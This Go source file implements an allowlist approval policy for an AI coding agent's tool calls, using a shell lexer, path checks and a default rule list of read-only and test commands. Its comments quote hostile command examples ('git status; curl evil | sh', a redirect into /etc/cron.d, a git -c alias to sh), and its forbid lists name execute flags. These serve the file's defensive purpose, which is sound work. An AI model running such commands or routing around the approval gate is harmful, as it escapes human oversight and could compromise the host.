package agentd

import (
	"path"
	"strings"
)

// The approval policy is an allowlist: nothing runs unless a rule names it, so an
// unrecognised bypass attempt ends in ask, not silent execution.

// Decision is what the policy says about one tool call.
type Decision string

const (
	// DecisionAllow runs without asking.
	DecisionAllow Decision = "allow"
	// DecisionAsk parks the call until a human answers. The default when no rule matches.
	DecisionAsk Decision = "ask"
)

// ToolCall is one request from the agent, mirroring claude-code's permission-prompt payload.
type ToolCall struct {
	Tool  string
	Input map[string]any
	ID    string
}

// command extracts the shell command from a Bash-shaped call.
func (c ToolCall) command() (string, bool) {
	s, ok := c.Input["command"].(string)
	return s, ok
}

// filePath extracts the target of a file-shaped call.
func (c ToolCall) filePath() string {
	for _, k := range []string{"file_path", "path", "notebook_path"} {
		if s, ok := c.Input[k].(string); ok && s != "" {
			return s
		}
	}
	return ""
}

// Rule allows one shape of call. There is no deny rule; ask is already the default.
type Rule struct {
	// Tool is the exact tool name. Required; there is no wildcard.
	Tool string

	// Argv is an argv prefix for a command-shaped tool, matched after lexing so
	// quoting cannot smuggle a program in. The first element matches on basename.
	Argv []string

	// Forbid lists argv tokens that disqualify a match, for read-only-looking
	// programs with an execute mode (find -exec, rg --pre).
	Forbid []string

	// PathPrefix restricts a file-shaped tool to a subtree. Empty means any path.
	PathPrefix string

	// Why is shown to the person reviewing the policy.
	Why string
}

// Policy is an ordered rule list. First match wins; no match is DecisionAsk.
type Policy struct {
	Rules []Rule
}

// Evaluate decides one call.
func (p Policy) Evaluate(c ToolCall) (Decision, Rule) {
	for _, r := range p.Rules {
		if r.matches(c) {
			return DecisionAllow, r
		}
	}
	return DecisionAsk, Rule{}
}

func (r Rule) matches(c ToolCall) bool {
	if r.Tool == "" || r.Tool != c.Tool {
		return false
	}

	if len(r.Argv) > 0 {
		cmd, ok := c.command()
		if !ok {
			return false
		}
		argv, control, parsed := lexCommand(cmd)
		// "git status; curl evil | sh" has an allowed prefix and must never match.
		if !parsed || control {
			return false
		}
		if !argvHasPrefix(argv, r.Argv) {
			return false
		}
		for _, bad := range r.Forbid {
			for _, tok := range argv {
				// Also catch the --flag=value form.
				if tok == bad || strings.HasPrefix(tok, bad+"=") {
					return false
				}
			}
		}
		return true
	}

	if r.PathPrefix != "" {
		p := c.filePath()
		if p == "" {
			return false
		}
		return withinPrefix(p, r.PathPrefix)
	}

	return true
}

// argvHasPrefix reports whether argv starts with want, comparing the program by basename.
func argvHasPrefix(argv, want []string) bool {
	if len(argv) < len(want) || len(want) == 0 {
		return false
	}
	if path.Base(argv[0]) != want[0] {
		return false
	}
	for i := 1; i < len(want); i++ {
		if argv[i] != want[i] {
			return false
		}
	}
	return true
}

// withinPrefix reports whether p is inside prefix after cleaning both, so
// "/work/../etc/passwd" is not inside "/work".
func withinPrefix(p, prefix string) bool {
	cp, cpre := path.Clean(p), path.Clean(prefix)
	if !strings.HasPrefix(cp, "/") {
		// A relative path depends on a working directory the policy does not know.
		return false
	}
	if cp == cpre {
		return true
	}
	return strings.HasPrefix(cp, strings.TrimSuffix(cpre, "/")+"/")
}

// lexCommand splits a shell command into argv with a minimal POSIX-ish lexer.
// control reports an unquoted shell control operator, which is never allowlistable.
// parsed is false for input the lexer cannot read (unterminated quote, trailing backslash).
func lexCommand(s string) (argv []string, control bool, parsed bool) {
	var cur strings.Builder
	started := false
	flush := func() {
		if started {
			argv = append(argv, cur.String())
			cur.Reset()
			started = false
		}
	}

	for i := 0; i < len(s); i++ {
		ch := s[i]
		switch ch {
		case ' ', '\t':
			flush()
		case '\n', '\r':
			control = true
			flush()
		case ';', '&', '|', '(', ')', '<', '>':
			// Redirection counts: "cat x > /etc/cron.d/y" is a write dressed as a read.
			control = true
			flush()
		case '`':
			control = true
			flush()
		case '$':
			// Any expansion, not just $(, is something an allowlist cannot vouch for.
			control = true
			flush()
		case '\\':
			if i+1 >= len(s) {
				return nil, control, false
			}
			i++
			cur.WriteByte(s[i])
			started = true
		case '\'':
			j := strings.IndexByte(s[i+1:], '\'')
			if j < 0 {
				return nil, control, false
			}
			cur.WriteString(s[i+1 : i+1+j])
			started = true
			i += j + 1
		case '"':
			// Inside double quotes backslash still escapes and $ still expands.
			j := i + 1
			for ; j < len(s) && s[j] != '"'; j++ {
				if s[j] == '\\' && j+1 < len(s) {
					j++
					cur.WriteByte(s[j])
					continue
				}
				if s[j] == '$' || s[j] == '`' {
					control = true
				}
				cur.WriteByte(s[j])
			}
			if j >= len(s) {
				return nil, control, false
			}
			started = true
			i = j
		default:
			cur.WriteByte(ch)
			started = true
		}
	}
	flush()
	if len(argv) == 0 {
		return nil, control, true
	}
	return argv, control, true
}

// DefaultPolicy is the allowlist Guided mode ships with: reads, searches, git
// inspection, and the project's own tests. Running tests is safe only because
// Write and Edit are not allowed, so the agent cannot edit a test and then run it.
var DefaultPolicy = Policy{Rules: []Rule{
	{Tool: "Read", Why: "reading a file changes nothing"},
	{Tool: "Glob", Why: "listing filenames changes nothing"},
	{Tool: "Grep", Why: "searching file contents changes nothing"},
	{Tool: "TodoWrite", Why: "the agent's own task list, local to the session"},

	{Tool: "Bash", Argv: []string{"ls"}, Why: "listing a directory"},
	{Tool: "Bash", Argv: []string{"pwd"}, Why: "printing the working directory"},
	{Tool: "Bash", Argv: []string{"cat"}, Why: "reading a file"},
	{Tool: "Bash", Argv: []string{"head"}, Why: "reading the start of a file"},
	{Tool: "Bash", Argv: []string{"tail"}, Why: "reading the end of a file"},
	{Tool: "Bash", Argv: []string{"wc"}, Why: "counting lines or bytes"},
	{Tool: "Bash", Argv: []string{"which"}, Why: "locating a program"},
	{Tool: "Bash", Argv: []string{"file"}, Why: "identifying a file type"},
	{Tool: "Bash", Argv: []string{"tree"}, Why: "listing a directory tree"},
	{Tool: "Bash", Argv: []string{"diff"}, Why: "comparing two files"},
	{Tool: "Bash", Argv: []string{"find"},
		Forbid: []string{"-exec", "-execdir", "-delete", "-ok", "-fprintf", "-fls"},
		Why:    "searching the filesystem, with its execute and delete modes excluded"},
	{Tool: "Bash", Argv: []string{"grep"}, Why: "searching file contents"},
	{Tool: "Bash", Argv: []string{"rg"}, Forbid: []string{"--pre", "--hostname-bin"},
		Why: "searching file contents, with its subprocess hooks excluded"},

	// Subcommands are named individually; a bare {"git"} rule would allow push and config.
	{Tool: "Bash", Argv: []string{"git", "status"}, Forbid: gitUnsafeFlags, Why: "inspecting the working tree"},
	{Tool: "Bash", Argv: []string{"git", "log"}, Forbid: gitUnsafeFlags, Why: "reading history"},
	{Tool: "Bash", Argv: []string{"git", "diff"}, Forbid: gitUnsafeFlags, Why: "reading uncommitted changes"},
	{Tool: "Bash", Argv: []string{"git", "show"}, Forbid: gitUnsafeFlags, Why: "reading an object"},
	{Tool: "Bash", Argv: []string{"git", "branch"}, Forbid: gitUnsafeFlags, Why: "listing branches"},
	{Tool: "Bash", Argv: []string{"git", "rev-parse"}, Forbid: gitUnsafeFlags, Why: "resolving a revision"},
	{Tool: "Bash", Argv: []string{"git", "blame"}, Forbid: gitUnsafeFlags, Why: "attributing lines"},

	{Tool: "Bash", Argv: []string{"go", "test"}, Why: "running the project's Go tests"},
	{Tool: "Bash", Argv: []string{"go", "vet"}, Why: "static analysis"},
	{Tool: "Bash", Argv: []string{"go", "build"}, Why: "compiling"},
	{Tool: "Bash", Argv: []string{"gofmt"}, Why: "formatting check"},
	{Tool: "Bash", Argv: []string{"pytest"}, Why: "running the project's Python tests"},
	{Tool: "Bash", Argv: []string{"npm", "test"}, Why: "running the project's tests"},
	{Tool: "Bash", Argv: []string{"npm", "run", "test"}, Why: "running the project's tests"},
	{Tool: "Bash", Argv: []string{"jest"}, Why: "running the project's tests"},
	{Tool: "Bash", Argv: []string{"vitest"}, Why: "running the project's tests"},
	{Tool: "Bash", Argv: []string{"cargo", "test"}, Why: "running the project's Rust tests"},
}}

// gitUnsafeFlags turn any git subcommand into arbitrary execution (git -c alias.x='!sh').
var gitUnsafeFlags = []string{"-c", "--exec-path", "--upload-pack", "--receive-pack"}
